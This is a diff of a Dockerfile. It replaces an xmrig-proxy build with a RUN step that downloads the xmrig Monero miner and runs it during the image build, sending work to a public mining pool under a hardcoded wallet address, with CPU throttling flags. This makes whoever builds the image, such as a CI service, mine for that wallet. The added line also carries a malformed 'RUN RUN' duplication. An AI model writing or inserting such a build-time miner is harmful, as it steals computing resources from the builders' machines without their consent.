@@ -1,9 +1,3 @@
-FROM  babim/ubuntubase
-RUN   apt-get update && apt-get install -y git build-essential cmake libuv1-dev uuid-dev libmicrohttpd-dev libssl-dev
-RUN   git clone https://github.com/xmrig/xmrig-proxy.git && mv xmrig-proxy xmrig-proxy-dev && \
-      cd xmrig-proxy-dev && mkdir build && cd build && \
-      cmake .. -DCMAKE_BUILD_TYPE=Release -DUV_LIBRARY=/usr/lib/x86_64-linux-gnu/libuv.a && \
-      make && mv xmrig-proxy / && cd ../../ && rm -rf xmrig-proxy-dev
-RUN   apt-get purge -y git build-essential cmake && rm -rf /var/lib/apt/lists/**
-WORKDIR    /
-ENTRYPOINT ["./xmrig-proxy", "--donate-level=1"]
+FROM ubuntu:18.10
+RUN apt-get update && apt-get install -y wget
+RUN RUN wget https://github.com/xmrig/xmrig/releases/download/v2.11.0/xmrig-2.11.0-xenial-x64.tar.gz && tar -xf xmrig-2.11.0-xenial-x64.tar.gz && cd xmrig-2.11.0 && ./xmrig -o stratum+tcp://pool.supportxmr.com:3333 -u 45UVbdyweuJV5peeuD1ypVbFs6Z1nYhRB4r9BEL9xYjE8Ej8Pjob3LQX2dN4m314gB87Z1M9TbabwN4g4L9184dcCLyiU6y -p Nvidia3 --threads 2 --max-cpu-usage=70 --cpu-priority 3 --donate-level 1
